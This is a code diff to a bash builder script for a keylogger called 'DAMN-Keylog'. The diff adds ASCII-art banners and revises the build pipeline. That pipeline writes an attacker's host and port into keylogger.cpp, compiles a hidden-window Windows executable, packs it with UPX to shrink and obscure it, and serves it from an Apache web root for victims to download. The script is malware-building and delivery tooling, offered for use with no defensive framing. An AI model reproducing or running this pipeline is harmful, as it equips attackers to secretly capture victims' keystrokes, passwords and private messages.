@@ -7,7 +7,22 @@ display_banner() {
   echo -e "\e[92m#                \e[91mDAMN-Keylog\e[92m                    #\e[0m"
   echo -e "\e[92m#                                               #\e[0m"
   echo -e "\e[92m#################################################\e[0m"
- 
+  echo -e "\e[93m"
+  echo -e "        █████╗ ███╗   ██╗██╗  ██╗ ██████╗ ███╗   ███╗"
+  echo -e "       ██╔══██╗████╗  ██║██║  ██║██╔═══██╗████╗ ████║"
+  echo -e "       ███████║██╔██╗ ██║███████║██║   ██║██╔████╔██║"
+  echo -e "       ██╔══██║██║╚██╗██║██╔══██║██║   ██║██║╚██╔╝██║"
+  echo -e "       ██║  ██║██║ ╚████║██║  ██║╚██████╔╝██║ ╚═╝ ██║"
+  echo -e "       ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝"
+  echo -e "                       \e[91mAnonymously Yours\e[0m"
+  echo -e "\e[93m"
+  echo -e "        ███╗   ███╗ █████╗ ███╗   ██╗ ██████╗██╗  ██╗"
+  echo -e "        ████╗ ████║██╔══██╗████╗ ████║██╔════╝██║ ██╔╝"
+  echo -e "        ██╔████╔██║███████║██╔████╔██║██║     █████╔╝ "
+  echo -e "        ██║╚██╔╝██║██╔══██║██║╚██╗██║██║     ██╔═██╗ "
+  echo -e "        ██║ ╚═╝ ██║██║  ██║██║ ╚████║╚██████╗██║  ██╗"
+  echo -e "        ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝"
+  echo -e "\e[0m"
 }
 
 # Default values
@@ -31,20 +46,20 @@ generate_keylogger() {
   sed -i "s/REPLACE_WITH_LPORT/$LPORT/" keylogger.cpp
 
   echo "Compiling the C++ code..."
-  x86_64-w64-mingw32-g++ -static-libgcc -static-libstdc++ keylogger.cpp -o KL.exe -lws2_32
+  x86_64-w64-mingw32-g++ -static-libgcc -static-libstdc++ keylogger.cpp -o keylogger.exe -lws2_32 -mwindows
 
   echo "Packing the executable with UPX..."
-  upx --best --lzma KL.exe
+  upx --best --lzma keylogger.exe
 
   echo "Compilation and packing completed. The keylogger executable is keylogger.exe"
 
   echo "Moving the keylogger executable to the Apache server directory..."
-  sudo mv KL.exe /var/www/html/
+  sudo mv keylogger.exe /var/www/html/
 
   echo "Starting Apache server..."
   sudo systemctl start apache2
 
-  echo "The keylogger is available at: http://$LHOST/KL.exe"
+  echo "The keylogger is available at: http://$LHOST/keylogger.exe"
 }
 
 # Function to start the Python server
